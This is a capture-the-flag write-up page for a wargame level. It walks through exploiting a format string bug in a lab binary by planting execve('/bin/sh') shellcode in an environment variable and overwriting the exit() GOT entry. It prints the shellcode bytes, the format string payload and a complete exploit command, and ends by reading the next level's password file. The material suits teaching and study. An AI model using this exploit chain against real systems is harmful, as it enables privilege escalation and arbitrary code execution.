---
sidebar_position: 7
---

import AsciinemaPlayer from '@site/src/components/AsciinemaPlayer';
import MissionObjective from '@site/src/components/MissionObjective';
import VulnerabilityCard from '@site/src/components/VulnerabilityCard';
import CodeBlock from '@site/src/components/CodeBlock';
import StepsList from '@site/src/components/StepsList';

# 🧞‍♂️ Level 05

<MissionObjective 
  level="Level 05"
  target="level06 privileges"
  method="Format string vulnerability with GOT overwrite"
/>

## Vulnerability Analysis

<VulnerabilityCard 
  type="Format String Vulnerability with GOT Overwrite"
  severity="critical"
  description="The binary uses printf(buffer) without format string, allowing arbitrary memory read/write. Combined with GOT overwrite technique, this enables shellcode execution by redirecting exit() calls."
  techniques={[
    "Format String Exploit",
    "GOT Overwrite", 
    "Shellcode Injection",
    "Environment Variable Abuse"
  ]}
/>

## Initial Program Analysis

<CodeBlock 
  title="Program Behavior"
  command="./level05"
  output={`$ ./level05
coucou
coucou
[Program exits]`}
/>

**Key Observations:**
- Program reads input and echoes it back
- Uses `fgets()` to read into 100-byte buffer
- Vulnerable `printf(buffer)` call - no format string!

## Vulnerability Discovery

<CodeBlock 
  title="GDB Assembly Analysis"
  command="gdb ./level05"
  output={`(gdb) disassemble main
...
0x08048500 <+188>: lea eax,[esp+0x28]   ; buffer address
0x08048504 <+192>: mov DWORD PTR [esp],eax
0x08048507 <+195>: call 0x8048340 <printf@plt>
...`}
/>

**Critical Vulnerability:**
```c
char buffer[100];
fgets(buffer, 100, stdin);
printf(buffer);  // <- FORMAT STRING VULNERABILITY
```

## Format String Analysis

<CodeBlock 
  title="Stack Position Detection"
  command='python -c "print(\"BBBB-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x-%x\")" | ./level05'
  output={`BBBB-64-f7fcfac0-f7ec3af9-ffffd6ff-ffffd6fe-0-ffffffff-ffffd784-f7fdb000-42424242-2d78252d
                                                                                      ^^^^^^^^
                                                                              BBBB found at 10th position`}
/>

**Key Finding:** Our input appears at the **10th argument position** (`%10$`)

## Shellcode Preparation

<CodeBlock 
  title="Environment Variable Shellcode"
  command="export PAYLOAD"
  output={`PAYLOAD=$(python -c 'print("\\x90"*1000 + 
"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c" +
"\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb" +
"\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh")')`}
/>

**Shellcode Components:**
- **NOP Sled**: 1000 bytes of `\x90` for reliable landing
- **Shellcode**: Classic execve("/bin/sh") payload
- **Strategy**: Store in environment for stable address

## Address Resolution

<StepsList
  title="Getting Shellcode Address"
  steps={[
    {
      title: "Create Address Helper",
      description: "Compile utility to get environment variable address",
      command: "gcc -m32 -o getenv getenv.c",
      result: "Helper program created"
    },
    {
      title: "Get Shellcode Address",
      description: "Find where PAYLOAD is stored in memory",
      command: "env -i PAYLOAD=$PAYLOAD /tmp/getenv PAYLOAD",
      result: "0xffffdc59 (example address)"
    },
    {
      title: "Locate exit() GOT Entry",
      description: "Find Global Offset Table entry for exit()",
      command: "(gdb) info functions exit",
      result: "exit@got.plt = 0x080497e0"
    }
  ]}
/>

<CodeBlock 
  title="Helper Program (getenv.c)"
  command="cat getenv.c"
  output={`#include <stdio.h>
#include <stdlib.h>

int main(int argc, char **argv) {
    printf("%p\\n", getenv(argv[1]));
    return 0;
}`}
/>

## GOT Overwrite Strategy

<CodeBlock 
  title="Target Analysis"
  command="(gdb) x/i 0x08048370"
  output={`0x08048370 <exit@plt>: jmp *0x080497e0
                                    ^^^^^^^^^^
                              GOT entry to overwrite`}
/>

**Attack Plan:**
- **Target**: `exit@got.plt` at `0x080497e0`
- **Goal**: Overwrite with shellcode address `0xffffdc59`
- **Method**: Format string `%n` writes

## Payload Construction

<CodeBlock 
  title="Address Splitting for 16-bit Writes"
  command="# Split 0xffffdc59 into two 16-bit writes"
  output={`Address: 0xffffdc59
Low bytes:  0xdc59 = 56401 decimal
High bytes: 0xffff = 65535 decimal

Write order:
1. 0x080497e0 <- 0xdc59 (lower 2 bytes)
2. 0x080497e2 <- 0xffff (upper 2 bytes)`}
/>

<CodeBlock 
  title="Format String Payload"
  command='python -c "print format_string"'
  output={`\\xe0\\x97\\x04\\x08   # Address 1: exit@got.plt
\\xe2\\x97\\x04\\x08   # Address 2: exit@got.plt+2
%56401d          # Pad to 0xdc59
%10$hn           # Write low bytes to address 1
%9126d           # Pad additional (65535-56401)
%11$hn           # Write high bytes to address 2`}
/>

## Final Exploitation

<CodeBlock 
  title="Complete Exploit Command"
  command="Launch exploit"
  output={`(python -c 'print "\\xe0\\x97\\x04\\x08"+
"\\xe2\\x97\\x04\\x08"+"%56401d"+"%10$hn"+"%9126d"+"%11$hn"';cat) | 
env -i PAYLOAD=$(python -c 'print "\\x90"*1000+
"\\xeb\\x1f\\x5e\\x89\\x76\\x08\\x31\\xc0\\x88\\x46\\x07\\x89\\x46\\x0c"+
"\\xb0\\x0b\\x89\\xf3\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\xcd\\x80\\x31\\xdb"+
"\\x89\\xd8\\x40\\xcd\\x80\\xe8\\xdc\\xff\\xff\\xff/bin/sh"') ./level05`}
/>

<CodeBlock 
  title="Successful Exploitation"
  command="# After exploit execution"
  output={`$ whoami
level06
$ cat /home/users/level06/.pass
[SUCCESS - Next level password revealed]`}
/>

## Technical Deep Dive

### Format String Mechanics

:::tip **How %n Works**
- `%d` consumes argument and prints decimal
- `%hn` writes number of printed characters (2 bytes) to address
- Position `%10$hn` writes to 10th argument (our controlled address)
- Padding controls the value written
:::

### GOT Overwrite Process

<CodeBlock 
  title="Memory Layout During Exploit"
  command="# Before and after GOT overwrite"
  output={`BEFORE:
exit@got.plt (0x080497e0): [libc exit address]

AFTER:  
exit@got.plt (0x080497e0): 0xffffdc59 (shellcode)

When program calls exit() -> jumps to our shellcode!`}
/>

## Exploit Breakdown

<StepsList
  title="Attack Sequence"
  steps={[
    {
      title: "Shellcode Injection",
      description: "Store shellcode in environment variable",
      command: "export PAYLOAD=...",
      result: "Shellcode at stable memory address"
    },
    {
      title: "Address Resolution",
      description: "Find shellcode and GOT addresses",
      command: "getenv + GDB analysis",
      result: "Target and destination addresses known"
    },
    {
      title: "Format String Attack",
      description: "Overwrite exit@got with shellcode address",
      command: "printf(controlled_format_string)",
      result: "GOT entry redirected to shellcode"
    },
    {
      title: "Trigger Execution",
      description: "Program calls exit() -> executes shellcode",
      command: "Normal program termination",
      result: "Shell spawned with escalated privileges"
    }
  ]}
/>

## Key Learning Points

:::warning **Advanced Techniques**
- **GOT Overwrite**: Hijacking function pointers in Global Offset Table
- **Format String Arithmetic**: Calculating precise padding values
- **Environment Exploitation**: Using env vars for stable shellcode addresses
- **Multi-stage Writes**: Using `%hn` for 16-bit writes to build full address
:::

## Technical Summary

This level demonstrates:
1. **Advanced Format String Exploitation** - Beyond simple memory disclosure
2. **GOT Overwrite Technique** - Function pointer hijacking
3. **Shellcode Injection via Environment** - Alternative delivery method
4. **Precise Memory Manipulation** - Calculated writes to specific addresses
5. **Binary Exploitation Chaining** - Combining multiple techniques

The vulnerability showcases how format string bugs can escalate from information disclosure to arbitrary code execution through careful memory manipulation.